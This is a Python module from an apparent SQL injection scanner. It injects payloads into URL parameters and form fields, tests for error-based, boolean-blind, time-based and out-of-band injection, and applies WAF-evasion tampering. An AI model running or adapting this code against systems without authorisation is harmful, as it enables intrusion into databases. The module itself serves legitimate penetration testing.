# -*- coding: utf-8 -*-
"""
SQLi Scanning Engine.

This module contains the core logic for testing injection points.
It will send crafted payloads and analyze the HTTP responses to determine
if a vulnerability exists. It will test for various SQLi types like
error-based, time-based, and boolean-based.
"""
import asyncio
import httpx
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import time
import base64
from sqli_hunter.payloads import SQL_ERROR_PATTERNS, ERROR_BASED_PAYLOADS, BOOLEAN_BASED_PAYLOADS, TIME_BASED_PAYLOADS, OOB_PAYLOADS, EXTRACTION_PAYLOADS_B64, EXTRACTION_QUERIES_B64
from sqli_hunter.tamper import apply_tampers, get_tampers_for_waf
from sqli_hunter.waf_detector import WafDetector

class Scanner:
    """
    The main scanning class that tests for SQL injection vulnerabilities.
    It now includes a WAF detector to apply adaptive tactics.
    """
    def __init__(self, client: httpx.AsyncClient):
        self.client = client
        self.waf_detector = WafDetector(client)
        self.vulnerable_points = []

    async def _get_response(self, url: str, timeout: int = 10) -> tuple[int, float]:
        """Helper to get response content length and duration."""
        start_time = time.time()
        try:
            response = await self.client.get(url, timeout=timeout)
            duration = time.time() - start_time
            return len(response.text), duration
        except httpx.RequestError:
            duration = time.time() - start_time
            return -1, duration

    def _check_for_sql_errors(self, html_content: str) -> str | None:
        """
        Checks the given HTML content for common SQL error patterns.
        """
        for pattern in SQL_ERROR_PATTERNS:
            if re.search(pattern, html_content, re.IGNORECASE):
                return pattern
        return None

    async def _scan_point_for_error_based_sqli(self, url: str, tampers: list[str]):
        """
        Tests a single URL (an injection point) for error-based SQLi.
        """
        print(f"[*] Testing for Error-Based SQLi on: {url}")
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        if not query_params: return

        for param_name, param_values in query_params.items():
            original_value = param_values[0]
            for payload in ERROR_BASED_PAYLOADS:
                tampered_payload = apply_tampers(payload, tampers)
                injected_params = query_params.copy()
                injected_params[param_name] = original_value + tampered_payload
                injected_url = urlunparse(parsed_url._replace(query=urlencode(injected_params, doseq=True)))

                try:
                    # We only need the content, not the time for error-based
                    response_text = (await self.client.get(injected_url, timeout=10)).text
                    error_found = self._check_for_sql_errors(response_text)
                    if error_found:
                        vuln_info = {"url": injected_url, "type": "Error-Based SQLi", "parameter": param_name, "payload": tampered_payload, "error": error_found}
                        print(f"[+] Vulnerability Found: {vuln_info}")
                        self.vulnerable_points.append(vuln_info)
                        return
                except httpx.RequestError as e:
                    print(f"[!] Request failed for {injected_url}: {e}")
        return

    async def _scan_point_for_boolean_based_sqli(self, url: str, tampers: list[str]):
        """
        Tests a single URL for boolean-based blind SQLi.
        """
        print(f"[*] Testing for Boolean-Based SQLi on: {url}")
        original_len, _ = await self._get_response(url)
        if original_len == -1: return

        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        if not query_params: return

        for param_name, param_values in query_params.items():
            original_value = param_values[0]
            for true_payload, false_payload in BOOLEAN_BASED_PAYLOADS:
                true_tampered = apply_tampers(true_payload, tampers)
                true_params = query_params.copy()
                true_params[param_name] = original_value + true_tampered
                true_url = urlunparse(parsed_url._replace(query=urlencode(true_params, doseq=True)))

                false_tampered = apply_tampers(false_payload, tampers)
                false_params = query_params.copy()
                false_params[param_name] = original_value + false_tampered
                false_url = urlunparse(parsed_url._replace(query=urlencode(false_params, doseq=True)))

                true_len, _ = await self._get_response(true_url)
                false_len, _ = await self._get_response(false_url)

                if true_len != -1 and false_len != -1 and original_len == true_len and original_len != false_len:
                    vuln_info = {"url": url, "type": "Boolean-Based Blind SQLi", "parameter": param_name, "payload": (true_payload, false_payload)}
                    print(f"[+] Vulnerability Found: {vuln_info}")
                    self.vulnerable_points.append(vuln_info)
                    return
        return

    async def _scan_point_for_time_based_sqli(self, url: str, tampers: list[str]):
        """
        Tests a single URL for time-based blind SQLi by averaging baseline time.
        """
        print(f"[*] Testing for Time-Based SQLi on: {url}")

        # Averaging 3 requests for a more stable baseline against network jitter
        baseline_times = []
        for _ in range(3):
            _, t = await self._get_response(url)
            if t != -1: baseline_times.append(t)

        if not baseline_times: return
        baseline_time = sum(baseline_times) / len(baseline_times)
        print(f"    -> Baseline response time (avg): {baseline_time:.2f}s")

        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        if not query_params: return

        for param_name, param_values in query_params.items():
            original_value = param_values[0]
            for payload_template, sleep_time in TIME_BASED_PAYLOADS:
                payload = payload_template.format(sleep=sleep_time)
                tampered_payload = apply_tampers(payload, tampers)

                injected_params = query_params.copy()
                injected_params[param_name] = original_value + tampered_payload
                injected_url = urlunparse(parsed_url._replace(query=urlencode(injected_params, doseq=True)))

                # We need a longer timeout to accommodate the sleep
                _, duration = await self._get_response(injected_url, timeout=sleep_time + 5)
                print(f"    -> Testing payload. Duration: {duration:.2f}s. Sleep: {sleep_time}s")

                # If response time is significantly longer than baseline (e.g., >90% of sleep time)
                if duration > baseline_time + (sleep_time * 0.9):
                    vuln_info = {"url": url, "type": "Time-Based Blind SQLi", "parameter": param_name, "payload": payload}
                    print(f"[+] Vulnerability Found: {vuln_info}")
                    self.vulnerable_points.append(vuln_info)
                    return
        return

    async def _scan_point_for_oob_sqli(self, url: str, tampers: list[str], collaborator_url: str):
        """
        Tries to trigger an Out-of-Band interaction.
        """
        print(f"[*] Testing for OOB SQLi on: {url}")
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        if not query_params: return

        for param_name, param_values in query_params.items():
            original_value = param_values[0]
            for payload_template in OOB_PAYLOADS:
                payload = payload_template.format(collaborator_url=collaborator_url)
                tampered_payload = apply_tampers(payload, tampers)

                injected_params = query_params.copy()
                injected_params[param_name] = original_value + tampered_payload
                injected_url = urlunparse(parsed_url._replace(query=urlencode(injected_params, doseq=True)))

                print(f"    -> Injecting OOB payload. Check your collaborator: {collaborator_url}")
                try:
                    # Fire and forget. We don't care about the response.
                    await self.client.get(injected_url, timeout=3)
                except httpx.RequestError:
                    # We expect timeouts or errors here, so we can safely ignore them.
                    pass
        return

    async def scan_target(self, target_item: dict, tampers: list[str], collaborator_url: str | None = None):
        """
        Scans a single target (URL or form) from the queue.
        """
        target_type = target_item.get("type")
        target_data = target_item.get("target")

        if not target_type or not target_data:
            return

        # Simple check to avoid re-scanning the same base URL/form action
        # A more robust check might be needed for complex cases
        scan_identifier = target_data if target_type == "url" else target_data["url"]
        if any(p['url'].split('?')[0] == scan_identifier.split('?')[0] for p in self.vulnerable_points):
            print(f"[*] Skipping {scan_identifier} as a vulnerability has already been found on this page/form action.")
            return

        if target_type == "url":
            await self._scan_point_for_error_based_sqli(target_data, tampers)
            if any(p['url'].split('?')[0] == scan_identifier.split('?')[0] for p in self.vulnerable_points):
                return
            await self._scan_point_for_boolean_based_sqli(target_data, tampers)
            await self._scan_point_for_time_based_sqli(target_data, tampers)
            if collaborator_url:
                await self._scan_point_for_oob_sqli(target_data, tampers, collaborator_url)

        elif target_type == "form":
            await self._scan_form_for_error_based_sqli(target_data, tampers)
            # TODO: Add boolean, time-based, and OOB scanning for forms as well.
        if self.vulnerable_points:
            print(f"\n[!!!] Found {len(self.vulnerable_points)} vulnerabilities.")
        else:
            print("\n[-] No vulnerabilities found.")

    async def _scan_form_for_error_based_sqli(self, form_details: dict, tampers: list[str]):
        """
        Tests a single HTML form for error-based SQLi.
        """
        url = form_details["url"]
        method = form_details["method"].upper()
        inputs = form_details["inputs"]

        print(f"[*] Testing Form for Error-Based SQLi on: {url} ({method})")

        # Iterate over each input field to inject payloads
        for input_to_test in inputs:
            # Skip non-text-like inputs
            if input_to_test.get("type") not in ["text", "textarea", "password", "email", "search", "url", "tel"]:
                continue

            for payload in ERROR_BASED_PAYLOADS:
                # Prepare form data, injecting the payload into the field under test
                data = {}
                for inp in inputs:
                    if inp["name"] == input_to_test["name"]:
                        data[inp["name"]] = inp.get("value", "") + payload
                    else:
                        data[inp["name"]] = inp.get("value", "")

                tampered_payload = apply_tampers(str(data[input_to_test["name"]]), tampers)
                data[input_to_test["name"]] = tampered_payload

                try:
                    if method == "POST":
                        response = await self.client.post(url, data=data, timeout=10)
                    else: # GET
                        response = await self.client.get(url, params=data, timeout=10)

                    error_found = self._check_for_sql_errors(response.text)
                    if error_found:
                        vuln_info = {"url": url, "type": "Error-Based SQLi (FORM)", "parameter": input_to_test["name"], "payload": tampered_payload, "error": error_found}
                        print(f"[+] Vulnerability Found: {vuln_info}")
                        self.vulnerable_points.append(vuln_info)
                        return # Move to the next form once a vulnerability is found
                except httpx.RequestError as e:
                    print(f"[!] Request failed for form at {url}: {e}")
        return

# Test code has been removed. This module is intended to be imported.
